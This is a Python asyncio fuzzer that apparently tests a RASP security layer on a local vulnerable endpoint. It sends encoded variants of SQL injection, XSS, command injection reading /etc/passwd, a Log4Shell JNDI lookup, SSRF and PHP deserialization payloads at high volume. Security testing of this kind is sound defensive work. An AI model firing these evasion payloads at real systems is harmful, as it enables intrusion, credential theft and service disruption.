import aiohttp
import asyncio
import json
import base64
import urllib.parse
import sys

URL = "http://localhost:8081/vuln/sqli"
HEADERS = {"Content-Type": "application/json", "X-RASP-Test": "enabled"}

PAYLOADS = [
    "' OR 1=1--", "UNION ALL SELECT NULL#", "<scr%00ipt>alert(1)</scr%00ipt>",
    "${IFS}cat${IFS}/etc/passwd", "${jndi:ldap://10.0.0.1:1389/obj}",
    "global['ev'+'al']('alert(1)')", "http://127.0.0.1", "O:4:\"Test\":1:{s:4:\"test\";s:3:\"123\";}"
]

async def fire(session, p):
    # Mutants arrays
    mutants = [
        p,
        urllib.parse.quote(p),
        base64.b64encode(p.encode()).decode(),
        ' '.join(list(p))
    ]
    for m in mutants:
        data = json.dumps({"q": m})
        try:
            async with session.post(URL, data=data, headers=HEADERS, timeout=5) as resp:
                status = resp.status
                if status == 200:
                    print(f"[!] BYPASS DETECTED: {m[:50]}")
        except Exception:
            pass # RASP likely blocked via socket drop

async def main():
    rate = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[1] == '--rate' else 1000
    print(f"[*] Starting rasp_fuzzer with concurrency rate {rate}")
    
    conn = aiohttp.TCPConnector(limit=rate)
    async with aiohttp.ClientSession(connector=conn) as session:
        tasks = []
        for i in range(500): # amplify for 25k requests
            for p in PAYLOADS:
                tasks.append(fire(session, p))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
